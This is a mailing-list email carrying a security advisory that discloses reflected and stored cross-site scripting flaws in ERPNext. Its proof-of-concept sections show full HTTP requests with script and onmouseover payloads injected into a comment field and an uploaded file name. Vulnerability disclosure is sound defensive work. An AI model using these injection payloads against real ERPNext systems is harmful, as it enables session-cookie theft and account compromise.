X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["8729" "Tuesday" "11" "May" "2021" "11:54:08" "+0000" "Stefan Pietsch" "s.pietsch@trovent.io" nil "267" "[oss-security] Trovent Security Advisory 2103-02 / Multiple XSS vulnerabilities in ERPNext 13.0.0/12.18.0" nil nil nil "5" nil nil (number mark "U       s.pietsch@tr May 11  267/8729  " thread-indent "\"[oss-security] Trovent Security Advisory 2103-02 / Multiple XSS vulnerabilities in ERPNext 13.0.0/12.18.0\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] Trovent Security Advisory 2103-02 / Multiple XSS vulnerabilities in ERPNext 13.0.0/12.18.0" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 28190 invoked by uid 550); 11 May 2021 11:57:12 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 26021 invoked from network); 11 May 2021 11:54:24 -0000
Date: Tue, 11 May 2021 11:54:08 +0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=trovent.io;
	s=protonmail3; t=1620734052;
	bh=mPIwZH0ZdAK8rdmjzzJxOFACMVvi/ZHwKITerzUphR0=;
	h=Date:To:From:Reply-To:Subject:From;
	b=XJ81cH6xFMaS9prsQwRKYnzNk7SfisjsYn6nyQ3yFzWH0iAmgecZ6VDrh6WYL21Cj
	 ozIptRvKiZiTrxrue/GOMjss8Y7XgQoVg5fYQFUAYh10erz99Gfuy2sTWMTiO+IQJp
	 L0vG0hJm8JzHGr7DU2pQEUyPB4jjqNusCLsuBNrEZhRLOohubGi2fCmppHshsm7W1a
	 n4Ch70hOTAls4SdZbEbii/1Oba8Nh/PEPbXLDX6Ur5rNW1zEJPRQJNYAuMltBeedzc
	 GJjipcFzMII+Ioeu9DEZllwW2x1PiCK+9M3S4EVz+hOJh44XXaj8XzYN6NjZGQEjco
	 aOtlyDmKUdo5Q==
To: "fulldisclosure@seclists.org" <fulldisclosure@seclists.org>, "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>, "submissions@packetstormsecurity.com" <submissions@packetstormsecurity.com>
From: Stefan Pietsch <s.pietsch@trovent.io>
Message-ID: <RIeuf4HIlGXELthOpSxxJHOq0HyO2lDwZRepEVlTYEZGANTCCc_Rboo7N9-9FAYmIwSbz4mQcR-QRuof5TFBbIWvka7w4RXymoAq3hfrxhM=@trovent.io>
MIME-Version: 1.0
Content-Type: multipart/signed; protocol="application/pgp-signature"; micalg=pgp-sha256; boundary="---------------------339c4711f3a60939ba8074638505c8c5"; charset=utf-8
Subject: [oss-security] Trovent Security Advisory 2103-02 / Multiple XSS vulnerabilities in ERPNext 13.0.0/12.18.0

-----------------------339c4711f3a60939ba8074638505c8c5
Content-Type: multipart/mixed;boundary=---------------------7a08937d4605a95fe844a6b0a5c6e003

-----------------------7a08937d4605a95fe844a6b0a5c6e003
Content-Transfer-Encoding: quoted-printable
Content-Type: text/plain;charset=utf-8

# Trovent Security Advisory 2103-02 #
#####################################


Multiple XSS vulnerabilities in ERPNext 13.0.0/12.18.0
######################################################


Overview
########

Advisory ID: TRSA-2103-02
Advisory version: 1.0
Advisory status: Public
Advisory URL: https://trovent.io/security-advisory-2103-02
Affected product: ERPNext
Tested versions: 12.18.0 and 13.0.0 beta
Vendor: Frapp=C3=A9 Technologies https://frappe.io
Credits: Trovent Security GmbH, Nick Decker, Stefan Pietsch


Detailed description
####################

Trovent Security GmbH discovered multiple Cross-Site-Scripting vulnerabilit=
ies
in the current software versions of ERPNext (13.0.0 and 12.18.0).
An attacker could leverage this attack to steal session cookies,
install a JavaScript keylogger and more.


1. Reflected XSS in _server_messages exception field
####################################################

When an API call causes an error the server sometimes sends back exception =
messages
containing the user input which is not sanitized.
This creates the possibility of reflected XSS in any API call/server functi=
on using "_server_messages".
This would be hard to exploit because we only found _server_messages except=
ions
in API calls made by the application itself not the user.

Severity: High
CVSS Score: 7.1 (CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:C/C:H/I:L/A:L)
CWE ID: 79
CVE ID: TBD

Proof of concept
################

Sample request intercepted with Burp to inject JavaScript. Note that the Ja=
vaScript
is injected in "reference_name" to raise an exception:

REQUEST:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
~~~~~


POST /api/method/frappe.desk.form.utils.add_comment HTTP/1.1
Host: sqlprodtest.local:1080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox=
/78.0
Accept: application/json
Accept-Language: en-US,en;q=3D0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=3DUTF-8
X-Frappe-CSRF-Token: e6532d5e7bef6360c9646d58e0940e8004820db8704ab3dad1d2d8=
75
X-Frappe-CMD:
X-Requested-With: XMLHttpRequest
Content-Length: 157
Origin: http://sqlprodtest.local:1080
Connection: close
Referer: http://sqlprodtest.local:1080/desk
Cookie: sid=3D0dfe3b41ff7d0a368a4f28cea4f45ce41b2eadec833c5bc42105355e; sys=
tem_user=3Dyes; full_name=3DAdministrator; user_id=3DAdministrator; user_im=
age=3D; io=3DLy9MpKRfK_nrKpurAAAN

reference_doctype=3DUser&reference_name=3D%3cscript%3ealert(1)%3c%2fscript%=
3e&content=3Dxsstest&comment_email=3DAdministrator


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
~~~~~



RESPONSE (removed the Stack Trace for better readability):

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
~~~~~


HTTP/1.1 417 EXPECTATION FAILED
Server: nginx/1.19.7
Date: Thu, 11 Mar 2021 14:23:05 GMT
Content-Type: application/json
Content-Length: 1894
Connection: close
Set-Cookie: sid=3D0dfe3b41ff7d0a368a4f28cea4f45ce41b2eadec833c5bc42105355e;=
 Expires=3DSun, 14-Mar-2021 14:23:05 GMT; Path=3D/
Set-Cookie: system_user=3Dyes; Path=3D/
Set-Cookie: full_name=3DAdministrator; Path=3D/
Set-Cookie: user_id=3DAdministrator; Path=3D/
Set-Cookie: user_image=3D; Path=3D/

{"exc_type":"LinkValidationError","exc":"[\"Traceback (...)]","_server_mess=
ages":"[\"{\\\"message\\\": \\\"Could not find Reference Name: <script>aler=
t(1)</script>\\\", \\\"indicator\\\": \\\"red\\\", \\\"raise_exception\\\":=
 1}\"]"}


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
~~~~~



2. Stored XSS everywhere where user input is stored inside of HTML tags
#######################################################################

The application does not sanitize escaped quotation marks (\").
This can be abused to escape the HTML attribute the input is stored in.
That allows the user to add new attributes like event handlers
and thus leading to stored XSS.
Our testing concluded that this issue is present in the entire application
the only requirement is that the input is being reflected
inside of an HTML tag not between them. It also can't be a linking
attribute like "href" because inside of them user input is escaped.
For example in combination with HTML injection through a comment,
a malicious user is able to modify his profile to steal cookies
from every user including administrators that view his profile.

Severity: High
CVSS Score: 8.2 (CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:L)
CWE ID: 79
CVE ID: TBD

Proof of concept
################

Sample request where the file name contains the XSS code with the escaped q=
uotation marks:

REQUEST:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
~~~~~


POST /api/method/upload_file HTTP/1.1
Host: sqlprodtest.local:1080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox=
/78.0
Accept: application/json
Accept-Language: en-US,en;q=3D0.5
Accept-Encoding: gzip, deflate
X-Frappe-CSRF-Token: e6532d5e7bef6360c9646d58e0940e8004820db8704ab3dad1d2d8=
75
Content-Type: multipart/form-data; boundary=3D---------------------------17=
3872902410009950314171894076
Content-Length: 74566
Origin: http://sqlprodtest.local:1080
Connection: close
Referer: http://sqlprodtest.local:1080/desk
Cookie: sid=3D0dfe3b41ff7d0a368a4f28cea4f45ce41b2eadec833c5bc42105355e; sys=
tem_user=3Dyes; full_name=3DAdministrator; user_id=3DAdministrator; user_im=
age=3D; io=3Do0Bglip9YmrzxZj9AAAX

------------------------------173872902410009950314171894076
Content-Disposition: form-data; name=3D"file"; filename=3D"user-enum.png\" =
onmouseover=3D\"alert(1234)\""
Content-Type: image/png

PNG
(...)


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
~~~~~



HTML code snippet from erpnext-server.com/desk#List/File/Home.
The user is able to escape the context of the title attribute and
add an onmouseover event which triggers the JavaScript:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
~~~~~


<div class=3D"level list-row small">
<div class=3D"level-left ellipsis">

<div class=3D"list-row-col ellipsis list-subject level">
<input class=3D"level-item list-row-checkbox hidden-xs" type=3D"checkbox" d=
ata-name=3D"a5ff65f666">
<span class=3D"level-item  ellipsis" title=3D"user-enum.png" onmouseover=3D=
"alert(1234)" "=3D"">
<a class=3D"ellipsis" href=3D"#Form/File/a5ff65f666" title=3D"user-enum.png=
" onmouseover=3D"alert(1234)" "=3D"">

<i class=3D"octicon octicon-file-text text-muted" style=3D"width: 16px;"></=
i>
<span>user-enum.png" onmouseover=3D"alert(1234)"</span>


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
~~~~~


Solution / Workaround
#####################

To mitigate this vulnerability, we recommend to always escape quotation mar=
ks.


History
#######

2021-03-08: Vulnerability found
2021-03-12: Advisory created and vendor contacted
2021-03-22: Vendor replied that they request CVE IDs after a fix is released
2021-04-19: Vendor informed about planned disclosure date (2021-05-11)
2021-05-03: Vendor contacted, asking for status
2021-05-07: No reply from vendor, vendor contacted again
2021-05-11: Advisory published

-----------------------7a08937d4605a95fe844a6b0a5c6e003--

-----------------------339c4711f3a60939ba8074638505c8c5
Content-Type: application/pgp-signature; name="signature.asc"
Content-Description: OpenPGP digital signature
Content-Disposition: attachment; filename="signature.asc"

-----BEGIN PGP SIGNATURE-----
Version: ProtonMail

wsFzBAEBCAAGBQJgmnBaACEJEM8er/4ehY63FiEE0wArIZvu5AKY9ZSXzx6v
/h6FjrfNkw//QMvOoCIMCaqEMWVp9i5JkJ8K1QVYfeNRbKkxm8b23AO6rvID
8XUDdZOrLksbUCPX76V8iRJvexIj6VlcKFc/5mZrvfzkTkX9dNtZh257ewEP
wLG2LTmZ/IWk4cDGHBdOBSO8DMdymZLLbliosAM8IEtrTcSIBp3IeD/JGxIs
p/sfGhKd8itGutnbxYtHJgRdzHOxdL4XVVsprgxIrOtbBtHjPF+XPmxqk3WG
WQ1NTGAnIfTaeVOxAGTzaDu7jKovv+2P2Q5uELgqkMtGhIEnmmQp5Gec7Xqx
1Gjo8czfmlCa9cNqHafQGF4nArxH141LlZC0Z6kNe4cYAY16pMoABeVwCCRT
K30m0FXkTSxF1gbVZwlWOO/yxY9Uxt4IPvEeiHdnGHwLw3w69LoC4DHnpoZz
9y+LUF3xFzX/AmnqGoiLq8R6R8J4mHZz8jd0GOpPlFI3y/06KPNeFoVr+NM0
7UwY9EoFcjINmligmz7wNlX1p+Zv29pQ0GBb0Y3VurBbt0EZdyceiOw7XU8o
95QdyTfBkIzroAt3gIn27Es5CN9FnZ+ZQSjc7BidDtNAzlOCzfUxRNxAUxwV
/98kDjR0qxpcxClCjThmTj7KOgY8PR75R1ipZb/3Me2eFjpYSn+sC+GEUuLK
7VO6ueGHT18XKgW+LlSH4WO23b++33tDYCw=
=FlhE
-----END PGP SIGNATURE-----


-----------------------339c4711f3a60939ba8074638505c8c5--

